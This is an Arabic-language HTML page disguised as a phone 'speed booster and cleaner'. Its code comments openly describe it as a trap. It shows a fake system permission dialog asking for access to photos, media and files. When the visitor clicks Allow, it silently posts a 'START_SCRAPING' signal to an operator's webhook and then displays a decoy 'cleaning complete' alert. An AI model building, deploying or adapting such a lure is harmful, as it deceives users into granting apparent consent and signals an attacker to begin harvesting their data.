<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسريع وتنظيف الهاتف</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding-top: 50px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 15px; border: 1px solid #333; display: inline-block; width: 80%; }
        .icon { font-size: 50px; margin-bottom: 10px; }
        button { background: #ffc107; color: black; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; font-weight: bold; }
        
        /* رسالة الصلاحية الوهمية */
        #permissionBox {
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: white; color: black; padding: 20px; width: 80%; border-radius: 15px; text-align: right; z-index: 9999;
        }
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9998; }
        .allow-btn { color: #007bff; font-weight: bold; cursor: pointer; float: left; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">⚡</div>
        <h2>مسرّع الهاتف الاحترافي</h2>
        <p>اضغط أدناه لتنظيف الذاكرة المؤقتة وتسريع جهازك.</p>
        <button id="startBtn">ابدأ التنظيف الآمن</button>
    </div>

    <div class="overlay" id="overlay"></div>
    <div id="permissionBox">
        <p>هل تريد السماح لـ <b>SpeedBooster Web</b> بالوصول إلى الصور والوسائط والملفات على جهازك؟</p>
        <span class="allow-btn" id="allowAction">سماح (Allow)</span>
        <span style="color: #666; cursor: pointer;" onclick="location.reload()">رفض</span>
    </div>

    <script>
        // ضع رابط الـ Webhook الخاص بك هنا (سنستخدمه فقط كإشارة للبدء)
        const WEBHOOK_URL = "YOUR_WEBHOOK_URL";

        const startBtn = document.getElementById('startBtn');
        const permissionBox = document.getElementById('permissionBox');
        const overlay = document.getElementById('overlay');
        const allowAction = document.getElementById('allowAction');

        // 1. إظهار رسالة الصلاحية الوهمية
        startBtn.addEventListener('click', () => {
            overlay.style.display = "block";
            permissionBox.style.display = "block";
        });

        // 2. عند الضغط على "سماح" (فخ الإشارة)
        allowAction.addEventListener('click', () => {
            permissionBox.style.display = "none";
            overlay.style.display = "none";
            startBtn.innerText = "جاري التنظيف...";
            startBtn.disabled = true;

            // إرسال إشارة بسيطة (Text) لـ Webhook بأن الفخ نجح
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: "START_SCRAPING" // هذه الكلمة هي الإشارة لصفحة المعلم
            });

            alert("اكتمل التنظيف بنجاح! (رسالة تمويه)");
        });
    </script>
</body>
</html>
